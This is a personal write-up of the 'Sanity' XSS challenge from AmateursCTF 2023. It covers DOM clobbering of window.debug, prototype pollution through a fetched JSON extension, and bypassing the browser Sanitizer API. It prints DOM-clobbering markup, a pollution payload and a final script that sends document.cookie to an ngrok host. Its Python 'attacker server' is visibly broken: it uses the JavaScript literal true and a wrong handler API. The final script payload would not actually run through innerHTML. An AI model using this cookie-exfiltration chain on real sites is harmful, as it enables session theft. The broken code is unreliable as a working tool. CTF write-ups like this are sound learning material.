---
title: Web Sanity Writeup AmateursCTF 2023 DOM Clobbering and Prototype Pollution
tags:
  - amateurs-ctf
  - writeup
  - sanity
  - xss
  - dom-clobbering
  - prototype-pollution
categories:
  - CTF
  - Writeups
summary: A complete writeup of sanity web challenge from AmateursCTF 2023. It covers the use of the Sanitizer API in browsers, DOM Clobbering, Parameter Pollution and XSS.  
created: 2023-07-21
lastmod: 2023-07-21
image: https://github.com/hash3liZer/khatta/assets/29171692/c70a5dc7-5294-45b7-8a9f-8a04ac9214b3
---

## Introduction
In the AmateursCTF 2023, there was a challenge by the name `Sanity`. Now, i wasn't able to solve the challenge within the due time as i got stuck on the very last step of my Proof of Concept. Neverthless, i feel like writing the writeup for this one. This challenge got me hooked up for quite some time.  

## Surface

We were given 2 files: `index.js` and `sanes.ejs`. The former is ofcourse the execution file which we are going launch and the other file is being parsed on the way to show the input we are going to enter. The `index.js` file was calling puppeteer which is a headless browser like selenium. The browser was visiting the server created by the script, attaching the cookie which contained the `flag` and the visiting the sanes page created when we submitted the data. In index.js where the flag was being attached: 

```javascript
...

app.get("/report/:sane", async (req, res) => {
  let ctx;
  try {
    ctx = await (await browser).createIncognitoBrowserContext();
    const visit = async (browser, sane) => {
      const page = await browser.newPage();
      await page.goto("http://localhost:3000");
      await page.setCookie({ name: "flag", value: process.env.FLAG });
      await page.goto(`http://localhost:3000/${sane}`);
      await page.waitForNetworkIdle({ timeout: 5000 });
      await page.close();
    };

...

// sanes.ejs file being parsed from the output
app.get("/:sane", (req, res) => {
  const sane = sanes.get(req.params.sane);
  if (!sane) return res.status(404).send("not found");

  res.render("sanes", {
    id: req.params.sane,
    title: encodeURIComponent(sane.title),
    body: encodeURIComponent(sane.body),
  });
});
```

Moving towards the template file, the template was using sanitizer API. Lets review the template file first: 
```html
<body>
    <h1 id="title">
        <script>
            const sanitizer = new Sanitizer();   <!-- This is whee the sanitizer API is being installed -->
            document.getElementById("title").setHTML(decodeURIComponent(`<%- title %>`), { sanitizer });
        </script>
    </h1>
    <div id="paste">
        <script>
            class Debug {
                #sanitize;
                constructor(sanitize = true) {
                    this.#sanitize = sanitize
                }

                get sanitize() {
                    return this.#sanitize;
                }
            }

            async function loadBody() {
                <! -- VULNERABLE CODE -->
                let extension = null;
                if (window.debug?.extension) {
                    let res = await fetch(window.debug?.extension.toString());
                    extension = await res.json();
                }

                const debug = Object.assign(new Debug(true), extension ?? { report: true });
                <!-- VULNERABLE CODE -->
                let body = decodeURIComponent(`<%- body %>`);
                if (debug.report) {
                    const reportLink = document.createElement("a");
                    reportLink.innerHTML = `Report <%= id %>`;
                    reportLink.href = `report/<%= id %>`;
                    reportLink.style.marginTop = "1rem";
                    reportLink.style.display = "block"

                    document.body.appendChild(reportLink)
                }

                <!-- EXECUTION POINT -->
                if (debug.sanitize) {
                    document.getElementById("paste").setHTML(body, { sanitizer })
                } else {
                    document.getElementById("paste").innerHTML = body
                }
            }

            loadBody();
        </script>
    </div>

</body>
```

As we can see in the above code, we have an interesting line where the javascript was checking for `debug.sanitize` property and if its false, the data was passed without any sanitization. Moreover, if we move a little above from this statement, we find our actual target. The following code: 
```javascript
let extension = null;
if (window.debug?.extension) {
    let res = await fetch(window.debug?.extension.toString());
    extension = await res.json();
}

const debug = Object.assign(new Debug(true), extension ?? { report: true });
```

What exactly is happening here inside the if condition, the control is checking if the `debug.extension` parameter on windows object exists or not. If it does, fetch the value from URL and pass it to our next statement where we are passing the properties of 2 different javascript objects to another. There are 2 possible vulnerabilities that can be exploited here to gain XSS by bypassing the sanitizer API: 

* DOM Clobbering
* Prototype Pollution

## Behind the Scenes
First things first, i normally work with Firefox but Sanitizer API gave me `undefined` error. So, i moved to chrome considering that `puppeteer` also uses chromium. 

![image](https://github.com/hash3liZer/khatta/assets/29171692/fbd6557c-4b5a-4955-8d12-f6e261f983e0)

Before moving forward, i'd another problem in mind about the `Debug` class. Inside the class we have: 
```javascript
class Debug {
    #sanitize;
    constructor(sanitize = true) {
        this.#sanitize = sanitize
    }

    get sanitize() {
        return this.#sanitize;
    }
}
```
The class parameter initialized is a private member. The problem here is i can't override the prameter value even with prototype pollution because its a private member. Neverthless, whats important is that default value is nothing and hence if during the exploitation, i would skip this parameter, then the `debug.sanitize` should resolve to `undefined` in the execution code condition. Well, now its a theory, so moving forward. 

### DOM Clobbering
The milestone is to initialize a `debug` parameter on browser windows object. 

With DOM Clobbering, if we give `id` to an element, the element is then initialized on browser's `window` object. I started with a simple `div` tag in the `Name Your Rant` field: 
```html
<div id="debug"></div>
```
![image](https://github.com/hash3liZer/khatta/assets/29171692/6362e084-0a44-493c-9c0a-a6f9878f3283)

Good enough, we got the html element. But now how to get the `extension` property on this element. I almost spend hours searching for this. Anyways, the following payload seems to give the html element as the string:
```html
<div id="debug"></div><div id="debug" name="extension" href="http://payload.shameerkashif.me"></div>
```

If we are to use the `anchor` tag instead of `div` tag, we will get the URL in return. So, our first part would look like: 
```
<a id="debug"></a><a id="debug" name="extension" href="http://payload.shameerkashif.me"></a>
```

![image](https://github.com/hash3liZer/khatta/assets/29171692/d1df6d24-3879-437a-b167-00d66f6c7345)

### Attacker Server
Here's the code that i generated using `bard`:
```python
import http.server
import json

def handle_request(request):
    response = {"message": "Hello, world!"}
    response_headers = {"Access-Control-Allow-Origin": "*"}
    return http.server.SimpleHTTPRequestHandler._set_headers(
        request, response, response_headers
    )

server = http.server.HTTPServer(('', 8000), handle_request)
server.serve_forever()

```

Run the code and proxy it through ngrok:
```
python3 server.py
ngrok http 8000
```

### Prototype Pollution
With having control of the `extension` variable, lets try to do parameter pollution at this point. The most basic payload that came to my mind: 
```javascript
{
  "__proto__": {
    "sanitize": false,
    "report": true
  }
}
```

But as assumed very earlier, this gave me error as i can't override the private member of Debug class. Well, the default value should be undefined when none provided for `get` function. Because, you see the simple sanitize resolves to the `get` function of the `Debug`. Since, we are overriding the prototype, we should leave it like this: 
```javascript
{
  "__proto__": {
    "report": true
  }
}
```

![image](https://github.com/hash3liZer/khatta/assets/29171692/8128f783-7c66-479d-8b10-39989c5346a2)

And we got to this point as well. 

#### Proof of Concept (POC)
Lets craft our final PoC. In the `name your rant` field we have: 
```html
<a id="debug"></a><a id="debug" name="extension" href="http://payload.shameerkashif.me"></a>
```

And for our server, we would give the following payload:
```python
import http.server
import json

def handle_request(request):
    response = {
      "__proto__": {
        "report": true
      }
    }
    response_headers = {"Access-Control-Allow-Origin": "*"}
    return http.server.SimpleHTTPRequestHandler._set_headers(
        request, response, response_headers
    )

server = http.server.HTTPServer(('', 8000), handle_request)
server.serve_forever()
```

And finally in the paste section, lets put our final payload to steal the cookie: 
```html
<script>fetch("http://ngrokurl/" + document.cookie)</script>
```

And we get the flag in the server url. As said i wasn't able to solve the challenge within due time as i got stuck with anchor tag issue. But neverthless, this was a fun challenge and was worth exploring. 
